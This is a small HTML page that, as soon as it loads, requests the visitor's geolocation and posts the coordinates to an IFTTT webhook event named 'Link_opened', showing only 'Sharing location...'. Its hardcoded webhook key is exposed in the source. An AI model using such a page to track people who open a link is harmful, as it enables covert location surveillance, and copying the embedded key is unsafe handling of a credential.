<!DOCTYPE html>
<html>
<head>
  <title>Location Sender</title>
  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var latitude = position.coords.latitude;
          var longitude = position.coords.longitude;

          // Build the IFTTT request
          var url = "https://maker.ifttt.com/trigger/Link_opened/with/key/iuwEGmz1sskpO7aR6oVBFCBIgrkCLRibC_3FrQcbJGm";
          fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              value1: latitude,
              value2: longitude
            })
          })
          .then(response => console.log("Location sent!"))
          .catch(error => console.error("Error:", error));
        }, function(error) {
          console.error("Error getting location:", error);
        });
      } else {
        console.error("Geolocation not supported");
      }
    }

    window.onload = sendLocation;
  </script>
</head>
<body>
  <h2>Sharing location...</h2>
</body>
</html>
